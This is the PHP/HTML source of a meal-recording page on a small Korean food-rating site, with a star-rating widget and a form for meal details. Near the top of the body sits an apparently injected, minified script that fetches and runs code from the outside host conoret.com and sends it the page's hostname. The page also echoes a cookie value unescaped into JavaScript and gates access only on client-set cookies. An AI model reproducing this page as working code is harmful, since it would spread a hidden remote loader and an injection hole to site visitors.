<!DOCTYPE html>
<?php
if(!isset($_COOKIE['user_name'])) {
    echo "<meta http-equiv='refresh' content='0;url=index.php'>";
    exit;
}
else {
    setcookie('user_name',$_COOKIE['user_name'],time()+(180),'/');
    setcookie('user_id',$_COOKIE['user_id'],time()+180,'/');
}
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="https://getbootstrap.com/docs/4.0/assets/img/favicons/favicon.ico">

    <title>ssosso-table.food-db.record</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">

    <!-- Favicons -->
    <link rel="apple-touch-icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
    <link rel="manifest" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/manifest.json">
    <link rel="mask-icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/safari-pinned-tab.svg" color="#7952b3">
    <link rel="icon" href="https://getbootstrap.com/docs/5.0/assets/img/favicons/favicon.ico">
    <meta name="theme-color" content="#7952b3">

    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>

    <!-- Custom styles for this template -->
    <script src="script/main/dsp" type="text/javascript" defer="" async=""></script>
    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="css/main/css2">
    <link rel="stylesheet" href="css/rating/css2">
    <link href="css/main/cover.css" rel="stylesheet">
<!--    <link rel="stylesheet" href="/css/meal.css">-->
    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
        html,
        body {
            font-family: Jua;
            height: 100%;
        }
        body {
            display: flex;
            align-items: center;
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #f5f5f5;
            color: #2c3034;
        }
        header {
            width: 550px;
        }
        .form_insert_meal {
            padding: 15px;
            margin: auto;
        }
        input {
            width: 100%;
        }
        #where span {
            font-size: 18px !important;
            font-weight: 200;
        }
        .nav-link {
            font-weight: 300 !important;
        }
        .nav-masthead .active {
            color: #2c3034;
            border-bottom-color: transparent;
        }
        a:focus, a:hover {
            border-bottom-color: #2c3034 !important;
            color: #2c3034 !important;
        }
        p {
            color: #2c3034 !important;
        }

    </style>

    <script src="script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
            src="https://code.jquery.com/jquery-3.6.0.min.js"
            integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
            crossorigin="anonymous"></script>
    <script src="/script/meal.js" type="text/javascript"></script>
    <script>
        let rating=-1
        function clear() {
            const stars=document.getElementById('rating').children
            for(let i=0;i<stars.length;i++) {
                stars[i].children[0].src='/src/rate_star_before.png'
            }
        }
        function set() {
            clear()
            const stars=document.getElementById('rating').children
            for(let i=0;i<=arguments[0];i++) {
                stars[i].children[0].src='/src/rate_star_after.png'
            }
            rating=arguments[0]+1
        }
        async function commit() {
            let record={}

            record.userId= <?php echo $_COOKIE['user_id'] ?>

                record.what=document.getElementById('what_input').value
            record.where=document.getElementById('where_input').value
            record.when=document.getElementById('when_input').value
            record.who=document.getElementById('who_input').value
            record.why=document.getElementById('why_input').value

            record.rating=rating


            const v=await $.post("script/meal_insert.php",record);

            document.getElementById('what_input').value=''
            document.getElementById('where_input').value=''
            document.getElementById('when_input').value=''
            document.getElementById('who_input').value=''
            document.getElementById('why_input').value=''

            clear()
        }
    </script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <header class="masthead mb-auto">
        <div class="inner">
            <h3 class="masthead-brand">소소식탁</h3>
            <nav class="nav nav-masthead justify-content-center">
                <a class="nav-link text-muted" href="http://ssossotable.com/rating.php">음식 평가하기</a>
                <a class="nav-link text-muted" href="http://ssossotable.com/insert.php">음식 추가하기</a>
                <a class="nav-link active" href="http://ssossotable.com/record.php">식사 기록하기</a>
            </nav>
        </div>
    </header>

    <main role="main" class="inner cover" id="rating"  style="margin-top: 20px;">
        <div class="card">
            <div class="card-body" id="title">
                <h5 class="card-title">식사 입력</h5>
                <p class="card-text">오늘 당신의 식사를 기록 해 주세요.</p>
            </div>
            <div id="rating">
                <span class="material-symbols-outlined" onclick="set(0)"><img src="/src/rate_star_before.png" height="50" width="50"></span>
                <span class="material-symbols-outlined" onclick="set(1)"><img src="/src/rate_star_before.png" height="50" width="50"></span>
                <span class="material-symbols-outlined" onclick="set(2)"><img src="/src/rate_star_before.png" height="50" width="50"></span>
                <span class="material-symbols-outlined" onclick="set(3)"><img src="/src/rate_star_before.png" height="50" width="50"></span>
                <span class="material-symbols-outlined" onclick="set(4)"><img src="/src/rate_star_before.png" height="50" width="50"></span>
            </div>
            <ul class="list-group list-group-flush">

                <li class="list-group-item">
                    <input type="text" id="what_input" placeholder="뭘 먹었나요?" autocomplete='off'>
                </li>
                <li class="list-group-item">
                    <input type="text" id="where_input" placeholder="어디서 먹었나요?" autocomplete='off'>
                </li>
                <li class="list-group-item">
                    <input type="text" id="when_input" placeholder="언제 먹었나요?" autocomplete='off'>
                </li>
                <li class="list-group-item">
                    <input type="text" id="who_input" placeholder="누구와 먹었나요?" autocomplete='off'>
                </li>
                <li class="list-group-item">
                    <input type="text" id="why_input" placeholder="왜 먹었나요?" autocomplete='off'>
                </li>
            </ul>
            <div class="card-body">
                <input type="button" value="기록하기" class="btn btn-info text-white" onclick="commit();">
            </div>
        </div>
    </main>

    <footer class="mastfoot mt-auto">
        <div class="inner">
            <p>Created by<a href="http://ssossotable.com"> ssosso.table</a>, by <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>
</div>

<script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.3/dist/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>

</body></html>